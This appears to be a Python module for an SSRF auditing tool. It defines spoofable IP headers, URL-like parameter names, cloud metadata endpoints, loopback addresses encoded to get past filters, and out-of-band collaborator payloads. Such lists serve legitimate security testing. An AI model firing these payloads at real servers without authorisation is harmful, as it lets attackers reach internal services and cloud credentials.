"""Payload definitions and generation logic for SSRF auditing."""

from typing import List

# Common HTTP headers evaluated by proxies, gateways, and backend web applications
TARGET_HEADERS = [
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Real-IP",
    "X-Custom-IP-Authorization",
    "Referer",
    "Forwarded",
    "X-Client-IP",
    "X-Host",
    "X-Originating-IP",
    "CF-Connecting-IP",
    "True-Client-IP",
]

# Frequent parameter names linked to URL retrieval, redirects, and file fetching
SUSPICIOUS_PARAMS = [
    "url", "dest", "redirect", "uri", "path", "continue", "window",
    "next", "data", "reference", "site", "html", "val", "validate",
    "domain", "callback", "feed", "host", "port", "to", "out", "view",
    "dir", "file", "document", "folder", "source", "load"
]

# Well-known cloud provider internal metadata endpoints
CLOUD_METADATA_TARGETS = [
    "http://169.254.169.254/latest/meta-data/",                     # AWS, OpenStack
    "http://metadata.google.internal/computeMetadata/v1/",          # GCP
    "http://169.254.169.254/metadata/v1.json",                      # DigitalOcean
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
    "http://100.100.100.200/latest/meta-data/",                     # Alibaba Cloud
]


def generate_bypass_payloads(collaborator_url: str = "") -> List[str]:
    """Generates standard bypass and test payloads for loopback addresses and OOB testing."""
    base_payloads = [
        # Standard local targets
        "http://127.0.0.1",
        "http://localhost",
        "http://[::1]",
        "http://0.0.0.0",
        "http://0",

        # Numeric and alternate IP notations (Bypass simple regex / filters)
        "http://2130706433",          # Decimal encoding for 127.0.0.1
        "http://017700000001",        # Octal encoding for 127.0.0.1
        "http://0x7f000001",          # Hexadecimal encoding for 127.0.0.1
        "http://127.1",               # Short form notation

        # DNS Wildcard / Rebinding services
        "http://127.0.0.1.nip.io",
        "http://localtest.me",
    ]

    base_payloads.extend(CLOUD_METADATA_TARGETS)

    if collaborator_url:
        clean_collab = collaborator_url.strip().removeprefix("http://").removeprefix("https://")
        base_payloads.extend([
            f"http://{clean_collab}",
            f"http://sub.{clean_collab}",
            f"http://127.0.0.1@{clean_collab}",
            f"http://{clean_collab}#127.0.0.1",
        ])

    return list(dict.fromkeys(base_payloads))
